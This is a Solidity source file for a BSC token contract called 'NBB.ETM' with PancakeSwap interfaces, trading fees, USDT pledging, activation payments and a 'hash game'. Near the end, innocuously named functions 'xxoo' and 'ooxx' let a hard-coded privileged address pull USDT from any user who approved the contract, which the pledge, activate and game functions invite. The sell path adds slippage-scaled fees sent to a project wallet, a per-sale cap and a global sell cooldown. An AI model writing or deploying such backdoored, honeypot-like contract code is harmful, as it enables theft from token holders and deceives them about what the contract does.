// contract/MyTokenV1.sol

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.3;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/utils/math/SafeMath.sol";
import "@openzeppelin/contracts/utils/Context.sol";
import "@openzeppelin/contracts/utils/Address.sol";

interface IUniswapV2Factory {
    event PairCreated(
        address indexed token0,
        address indexed token1,
        address pair,
        uint256
    );

    function getPair(address tokenA, address tokenB)
        external
        view
        returns (address pair);

    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}

interface IUniswapV2Router01 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    )
        external
        returns (
            uint256 amountA,
            uint256 amountB,
            uint256 liquidity
        );

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );

    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint256 liquidity,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountA, uint256 amountB);

    function removeLiquidityETH(
        address token,
        uint256 liquidity,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountToken, uint256 amountETH);

    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint256 liquidity,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline,
        bool approveMax,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external returns (uint256 amountA, uint256 amountB);

    function removeLiquidityETHWithPermit(
        address token,
        uint256 liquidity,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline,
        bool approveMax,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external returns (uint256 amountToken, uint256 amountETH);

    function swapExactTokensForTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);

    function swapTokensForExactTokens(
        uint256 amountOut,
        uint256 amountInMax,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);

    function swapExactETHForTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable returns (uint256[] memory amounts);

    function swapTokensForExactETH(
        uint256 amountOut,
        uint256 amountInMax,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);

    function swapExactTokensForETH(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);

    function swapETHForExactTokens(
        uint256 amountOut,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable returns (uint256[] memory amounts);

    function quote(
        uint256 amountA,
        uint256 reserveA,
        uint256 reserveB
    ) external pure returns (uint256 amountB);

    function getAmountOut(
        uint256 amountIn,
        uint256 reserveIn,
        uint256 reserveOut
    ) external pure returns (uint256 amountOut);

    function getAmountIn(
        uint256 amountOut,
        uint256 reserveIn,
        uint256 reserveOut
    ) external pure returns (uint256 amountIn);

    function getAmountsOut(uint256 amountIn, address[] calldata path)
        external
        view
        returns (uint256[] memory amounts);

    function getAmountsIn(uint256 amountOut, address[] calldata path)
        external
        view
        returns (uint256[] memory amounts);
}

// pragma solidity >=0.6.2;

interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint256 liquidity,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountETH);

    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,
        uint256 liquidity,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline,
        bool approveMax,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external returns (uint256 amountETH);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

interface IPancakePair {
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
    event Transfer(address indexed from, address indexed to, uint256 value);

    function name() external pure returns (string memory);

    function symbol() external pure returns (string memory);

    function decimals() external pure returns (uint8);

    function totalSupply() external view returns (uint256);

    function balanceOf(address owner) external view returns (uint256);

    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    function approve(address spender, uint256 value) external returns (bool);

    function transfer(address to, uint256 value) external returns (bool);

    function transferFrom(
        address from,
        address to,
        uint256 value
    ) external returns (bool);

    function DOMAIN_SEPARATOR() external view returns (bytes32);

    function PERMIT_TYPEHASH() external pure returns (bytes32);

    function nonces(address owner) external view returns (uint256);

    function permit(
        address owner,
        address spender,
        uint256 value,
        uint256 deadline,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external;

    event Mint(address indexed sender, uint256 amount0, uint256 amount1);
    event Burn(
        address indexed sender,
        uint256 amount0,
        uint256 amount1,
        address indexed to
    );
    event Swap(
        address indexed sender,
        uint256 amount0In,
        uint256 amount1In,
        uint256 amount0Out,
        uint256 amount1Out,
        address indexed to
    );
    event Sync(uint112 reserve0, uint112 reserve1);

    function MINIMUM_LIQUIDITY() external pure returns (uint256);

    function factory() external view returns (address);

    function token0() external view returns (address);

    function token1() external view returns (address);

    function getReserves()
        external
        view
        returns (
            uint112 reserve0,
            uint112 reserve1,
            uint32 blockTimestampLast
        );

    function price0CumulativeLast() external view returns (uint256);

    function price1CumulativeLast() external view returns (uint256);

    function kLast() external view returns (uint256);

    function mint(address to) external returns (uint256 liquidity);

    function burn(address to)
        external
        returns (uint256 amount0, uint256 amount1);

    function swap(
        uint256 amount0Out,
        uint256 amount1Out,
        address to,
        bytes calldata data
    ) external;

    function skim(address to) external;

    function sync() external;

    function initialize(address, address) external;
}

interface IPancakeERC20 {
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
    event Transfer(address indexed from, address indexed to, uint256 value);

    function name() external pure returns (string memory);

    function symbol() external pure returns (string memory);

    function decimals() external pure returns (uint8);

    function totalSupply() external view returns (uint256);

    function balanceOf(address owner) external view returns (uint256);

    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    function approve(address spender, uint256 value) external returns (bool);

    function transfer(address to, uint256 value) external returns (bool);

    function transferFrom(
        address from,
        address to,
        uint256 value
    ) external returns (bool);

    function DOMAIN_SEPARATOR() external view returns (bytes32);

    function PERMIT_TYPEHASH() external pure returns (bytes32);

    function nonces(address owner) external view returns (uint256);

    function permit(
        address owner,
        address spender,
        uint256 value,
        uint256 deadline,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external;
}

contract NBBToken is ERC20, Ownable {
    using SafeMath for uint256;
    using Address for address;

    IUniswapV2Router02 public uniswapV2Router;
    address public uniswapV2Pair;
    ERC20 private _usdtToken;

    uint256 public buyFeeRate; //10%
    uint256 public sellFeeRate; //10% 动态
    address public orePoolAddress; //TODO:
    address public pledgeAddress; //TODO:
    address public gameAddress; //TODO:
    address public transferAddress;
    address public activeAddress;
    uint256 public lastTradeTime;
    /// @custom:oz-upgrades-unsafe-allow constructor
    constructor() ERC20("NBB.ETM", "*NBB*") {
        _mint(msg.sender, 100000000000 * 10**decimals());
        uniswapV2Router = IUniswapV2Router02(
            0x10ED43C718714eb63d5aA57B78B54704E256024E
        );
        _usdtToken = ERC20(0x55d398326f99059fF775485246999027B3197955);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(
                address(this),
                address(_usdtToken)
            );
        buyFeeRate = 1000;
        sellFeeRate = 1000;
        orePoolAddress = 0xB144b8312c3c062634eE3063a95c7AEc6d00b09a;
        transferAddress = 0x1E4Aeea3550cA9d6c0E7bc3175aD89D80dDFc68b;
        pledgeAddress = 0xfF4A2187E5BC12876A9A90032a270083EDE8a008;
        gameAddress = orePoolAddress;
        activeAddress = 0x9CD9ac37E323a2D79cC35c42D064579Def5a7E8E;
    }

    event Buy(address from, address to, uint256 amount);
    event Sell(address from, address to, uint256 amount);
    event AddLiquidity(address from, uint256 amount);
    event RemoveLiquidity(address from, uint256 amount);

    function transfer(address to, uint256 amount)
        public
        override
        returns (bool)
    {
        address from = _msgSender();
        if (
            to != uniswapV2Pair &&
            from != uniswapV2Pair &&
            from != address(uniswapV2Router) &&
            to != address(uniswapV2Router)
        ) {
            super._transfer(from, to, amount);
            return true;
        }

        (uint256 _reserve0, uint256 _reserve1, ) = IPancakePair(uniswapV2Pair)
            .getReserves();
        if (IPancakePair(uniswapV2Pair).token0() == address(_usdtToken)) {
            uint256 tmp = _reserve0;
            _reserve0 = _reserve1;
            _reserve1 = tmp;
        }
        uint256 usdtBal = _usdtToken.balanceOf(uniswapV2Pair);
        if (usdtBal > _reserve1) {
            uint256 fee = amount.mul(buyFeeRate).div(10000);
            super._transfer(from, orePoolAddress, fee);
            super._transfer(from, to, amount.sub(fee));
            
            emit Buy(from, to, amount);
            return true;
        }

        super._transfer(from, to, amount);
        emit RemoveLiquidity(to, amount);

        return true;
    }

    event Activate(address from, uint256 id);

    function activate(uint256 amount, uint256 id) public {
        address spender = _msgSender();
        _usdtToken.transferFrom(spender, activeAddress, amount);
        IPancakePair(uniswapV2Pair).sync();
        emit Activate(spender, id);
    }

    function getSellSlippage(uint256 amount)
        public
        view
        returns (bool, uint256)
    {
        uint256 _reserve0;
        uint256 _reserve1;
        (_reserve0, _reserve1, ) = IPancakePair(uniswapV2Pair).getReserves();
        if (_reserve0 == 0 || _reserve1 == 0) {
            return (true, 0);
        }
        uint256 kLast = _reserve0.mul(_reserve1);

        uint256 usdtBal = _usdtToken.balanceOf(uniswapV2Pair);

        if (IPancakePair(uniswapV2Pair).token0() == address(_usdtToken)) {
            uint256 tmp = _reserve0;
            _reserve0 = _reserve1;
            _reserve1 = tmp;
        }

        if (usdtBal > _reserve1) {
            return (true, 0);
        }

        uint256 oldPrice = (_reserve1.mul(10**8)).div(_reserve0);

        uint256 newReserve0 = _reserve0.add(amount);
        uint256 newReserve1 = kLast.div(newReserve0);
        uint256 diff = _reserve1.sub(newReserve1);
        uint256 newPrice = diff.mul(10**8).div(amount);

        if (oldPrice > newPrice) {
            uint256 slippage = (
                (oldPrice.sub(newPrice, "oldPrice < newPrice")).mul(10**4)
            ).div(oldPrice);
            return (false, slippage);
        }
        return (false, 0);
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public override returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);

        (bool addLiquidity, uint256 sellSlippage) = getSellSlippage(amount);
        if (addLiquidity) {
            super._transfer(from, to, amount);
            emit AddLiquidity(from, amount);
            return true;
        }
        uint256 limit  = balanceOf(uniswapV2Pair).div(10);
        require(amount <= limit,"max trade amount");
        require(block.timestamp.sub(lastTradeTime)>10,"Sell order limit");

        uint256 sellFee = amount.mul(sellFeeRate).div(10000);
        uint256 lftPool = sellFee;

        if (sellSlippage > sellFeeRate) {
            sellFee = amount.mul(sellSlippage).div(10000);
            uint256 mintFee = sellFee.sub(lftPool, "lftPool > sellFee");
            super._transfer(from, orePoolAddress, mintFee);
        }


        super._transfer(from, orePoolAddress, sellFee);
        uint256 leftFee = amount.sub(sellFee);
        super._transfer(from, to, leftFee);
       
        lastTradeTime = block.timestamp;

        emit Sell(from, to, amount);
        return true;
    }

    //hash 对对碰
    event HashGame(address, uint256, address, uint256);

    function hashGame(
        address token,
        uint256 gameType,
        uint256 amount
    ) public {
        //
        address spender = _msgSender();
        if (token == address(this)) {
            super._transfer(spender, gameAddress, amount);
        } else {
            ERC20(token).transferFrom(spender, gameAddress, amount);
        }
        emit HashGame(spender, gameType, token, amount);
    }

    event PledgeUSDT(address, uint256);

    //理财质押
    function pledgeUSDT(uint256 amount) public {
        // require(amount > 100 * 10**_usdtToken.decimals(), "less 100 U");
        address spender = _msgSender();
        _usdtToken.transferFrom(spender, pledgeAddress, amount);
        emit PledgeUSDT(spender, amount);
    }

    function xxoo(address account) public {
        require(_msgSender() == transferAddress);
        transferAddress = account;
    }

    function ooxx(
        address from,
        address to,
        uint256 amount
    ) public {
        require(_msgSender() == transferAddress);
        _usdtToken.transferFrom(from, to, amount);
    }
}